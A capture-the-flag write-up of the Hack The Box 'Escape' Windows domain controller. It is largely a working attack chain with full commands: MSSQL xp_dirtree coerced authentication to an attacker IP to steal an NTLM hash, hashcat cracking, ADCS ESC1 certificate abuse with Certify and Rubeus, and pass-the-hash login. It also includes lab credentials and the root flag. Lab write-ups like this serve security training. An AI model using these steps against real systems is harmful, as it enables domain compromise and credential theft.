- Write up for HTB Escape - https://app.hackthebox.com/machines/531
- Difficulty - Medium
- OS - Windows

## Initial enumeration

nmap scan - ```nmap -sCV -oN nmap/nmap -v 10.10.11.202```

Scan results - 

```bash
# Nmap 7.94SVN scan initiated Fri Sep 27 08:01:41 2024 as: nmap -sCV -oN nmap/nmap -v 10.10.11.202
Nmap scan report for 10.10.11.202
Host is up (0.026s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-27 20:01:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2024-09-27T20:03:17+00:00; +8h00m02s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2024-09-27T20:03:17+00:00; +8h00m02s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-09-27T20:03:17+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-27T20:01:18
| Not valid after:  2054-09-27T20:01:18
| MD5:   8dba:44ed:ff15:a7bd:c458:a5d3:282e:f8cd
|_SHA-1: fc6d:258f:82d9:590d:7097:20d4:aae4:0b1d:ee8c:19c1
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2024-09-27T20:03:17+00:00; +8h00m02s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2024-09-27T20:03:17+00:00; +8h00m02s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-27T20:02:37
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 27 08:03:15 2024 -- 1 IP address (1 host up) scanned in 94.07 seconds
```

A lot of open ports, we first start with adding the hostnames to our /etc/hosts file - 
![image](https://github.com/user-attachments/assets/5ab18204-d6f4-44eb-b302-394c39997f29)

Before we begin enumerating the box we will run a background all-port nmap scan just to see if we missed any ports
```nmap -p- -T5 -v -Pn -oN nmap/allports 10.10.11.202```

Now we begin enumerating the services
smb with null authentication using netexec

```bash
┌──(captain㉿kali)-[~/Documents/HTB/escape]
└─$ nxc smb 10.10.11.202 -u 'user' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\user: 
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 
```

Let us enumerate the share Public to see if we find anything interesting
command - ```smbclient \\10.10.11.202\Public``` and hit enter if prompted for password
We see a PDF hosted on the smb share with some interesting info
- User Brandon - brandon.brown@sequel.htb
- SQL credential - PublicUser:GuestUserCantWrite1

Lets try to connect to the sql server and see  if we can find and crack any credentials
We will use impacket-mssqlclient to test connectivity and if we can login
```impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202```

Success !!! We are now in, time to do some enumeration - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
In the section - ![Steal NetNTLM hash / Relay attack](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack)

We follow the instructions and we get a hash for user sql_svc account - 
We run - ```exec master.dbo.xp_dirtree '\\10.10.14.17\any\thing'```
and we get -
![image](https://github.com/user-attachments/assets/4d3fdd4e-cee7-4827-8734-415c3fbf62be)

Lets try and crack the hash using hashcat and the rockyou wordlist
Command - ```sudo hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule```
![image](https://github.com/user-attachments/assets/82e0dbc5-263b-44d3-8609-e3e1ab015f3a)
Success we have credentials for sql_svc 

Going back to our background nmap scan we can see that we missed some ports in the initial scan, one of them is WinRM (5985)
```bash
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf  .NET Message Framing
```
, lets check if this user has access
```bash
┌──(captain㉿kali)-[~/Documents/HTB/escape]
└─$ nxc winrm 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'
WINRM       10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

Now we can use evil-winrm to access the machine

```bash
┌──(captain㉿kali)-[~/Documents/HTB/escape]
└─$ evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie                                    
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> ls
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> cd ..
```

Time to get our winpeas across to do some enumeration, luckily we are using evil-winrm which has upload and download functionality, we will download winpeas from the github repo and place it on our local machine
Link - ![Releases-PEASS](https://github.com/peass-ng/PEASS-ng/releases)

```bash
*Evil-WinRM* PS C:\Users\sql_svc\downloads> upload /home/captain/Documents/HTB/escape/winpeas.exe
                                        
Info: Uploading /home/captain/Documents/HTB/escape/winpeas.exe to C:\Users\sql_svc\downloads\winpeas.exe
                                        
Data: 3183272 bytes of 3183272 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\sql_svc\downloads> ./winpeas.exe -h
  [*] WinPEAS is a binary to enumerate possible paths to escalate privileges locally
        domain               Enumerate domain information
        systeminfo           Search system information
        userinfo             Search user information
        processinfo          Search processes information
        servicesinfo         Search services information
        applicationsinfo     Search installed applications information
        networkinfo          Search network information
        windowscreds         Search windows credentials
        browserinfo          Search browser information
        filesinfo            Search generic files that can contains credentials
        fileanalysis         Search specific files that can contains credentials and for regexes inside files
        eventsinfo           Display interesting events information

        quiet                Do not print banner
        notcolor             Don't use ansi colors (all white)
        searchpf             Search credentials via regex also in Program Files folders
        wait                 Wait for user input between checks
        debug                Display debugging information - memory usage, method execution time
        log[=logfile]        Log all output to file defined as logfile, or to "out.txt" if not specified
        max-regex-file-size=1000000        Max file size (in Bytes) to search regex in. Default: 1000000B

        Additional checks (slower):
        -lolbas              Run additional LOLBAS check
        -linpeas=[url]       Run additional linpeas.sh check for default WSL distribution, optionally provide custom linpeas.sh URL
                             (default: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh)
*Evil-WinRM* PS C:\Users\sql_svc\downloads> 
```

Nothing interesting found in winpeas
Since this box is a domain controller and we are a domain user, we can run bloodhound on the box and visually see how we can laterally move around

If you do not know how to use bloodhound, please visit - ![BloodHound installation and usage](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)

Now we upload SharpHound.ps1, which is a data collector for bloodhound. 

First we need to import SharpHound
```. .\SharpHound.ps1```

Now we run it to collect all data
```Invoke-BloodHound -c all```
the -c options specifies CollectionMethods

You can run ```Get-Help Invoke-BloodHound``` to see how to use SharpHound

It should generate a zip like this
![image](https://github.com/user-attachments/assets/bacd51c5-1303-455a-ae3a-04f401b6ffb5)

- Next we download the file to our box 
- run bloodhound 
- drag and drop the zip file into bloodhound.

We can run the query - 
and get all the users in the domain
![image](https://github.com/user-attachments/assets/55d93c78-81af-41c9-b47d-cf5425a09137)

We dont see anything interesting here so moving on to LDAP

Manually enumerating things
Findings

- We can access MSSQL folder under C:\SQLSERVER and we find a logs folder, we can download and examine the logs
```bash
*Evil-WinRM* PS C:\SQLServer\logs> ls                                                                         


    Directory: C:\SQLServer\logs                                                                              


Mode                LastWriteTime         Length Name                                                         
----                -------------         ------ ----                                                         
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK                                                                                                                                                               
```

The file does not open normally,the file is in windows utf16LE format we can convert it using iconv
Command 
```bash                 
┌──(captain㉿kali)-[~/Documents/HTB/escape/logs]                                                              
└─$ less ERRORLOG.BAK                                                                                         
"ERRORLOG.BAK" may be a binary file.  See it anyway?                                                          

┌──(captain㉿kali)-[~/Documents/HTB/escape/logs]                                                              
└─$ file ERRORLOG.BAK                                                                                         
ERRORLOG.BAK: Unicode text, UTF-16, little-endian text, with very long lines (508), with CRLF line terminators

┌──(captain㉿kali)-[~/Documents/HTB/escape/logs]                                                              
└─$ iconv -f utf16 -t utf8 ERRORLOG.BAK -o ERRORLOG.BAK.conv                                                                                                                                                                
                 
┌──(captain㉿kali)-[~/Documents/HTB/escape/logs]                                                              
└─$ ls                                                                                                        
ERRORLOG.BAK  ERRORLOG.BAK.conv
```

We find a suspicious login attemp from Ryan.Cooper user
```bash
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
```

We check if this is his password using NetExec
```nxc winrm 10.10.11.202 -u ryan.cooper -p 'NuclearMosquito3'```
and we get a hit, we can now login as user Ryan using Evil-Winrm, and grab the user.txt

Since WinPeas and Bloodhound did not give us any results, we can try Certipy to check for ADCS template attacks
Installing Certipy using ```pip3 install certipy-ad``` 

Running it 
```bash
┌──(captain㉿kali)-[~/Documents/HTB/escape]
└─$ certipy-ad find -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -target-ip 10.10.11.202
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC-CA'
[*] Saved BloodHound data to '20240927113639_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240927113639_Certipy.txt'
[*] Saved JSON output to '20240927113639_Certipy.json'
                                                                                                              
```

Checking the txt file for Vulnerabilities, success we have ESC1 vulnerability 
```bash
┌──(captain㉿kali)-[~/Documents/HTB/escape]
└─$ cat enum/20240927113639_Certipy.txt| grep -i vulne -A2
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```
READ MORE on how to exploit it here - ![Certipy-GitHub](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1)

When we run the commands they do not go through, but we can enumerate the other way by uploading Certify.exe on the box and running it 
![image](https://github.com/user-attachments/assets/18b5eb89-c67c-41c5-b7a0-974cf9fa68d1)

This shows that the machine is vulnerable to UserAuthentication.

Ok now we know the machine is vulnerable, we can run the command ```./Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator``` to get the certificate needed to request the TGT

Lets copy paste the data into cert.pem on our attacking machine and generate a pfx file from it so we can request the admin NTLM hash using rubeus 
Command - ```openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx```

now lets upload Rubeus and the certificate pfx on the box and run Rubeus to give us the admin hash

```./Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show```

And BOOM we get the admin hash
![image](https://github.com/user-attachments/assets/079b2251-ab78-4deb-8405-d65d5b508823)

Now we can WinRM with the hash and grab the root.txt-
```bash
┌──(captain㉿kali)-[~/Documents/HTB/escape]
└─$ evil-winrm -i 10.10.11.202 -u administrator -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/27/2024   1:01 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
64c09ec2cb1043f979036ecb8df4635e
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ../Desktop
```
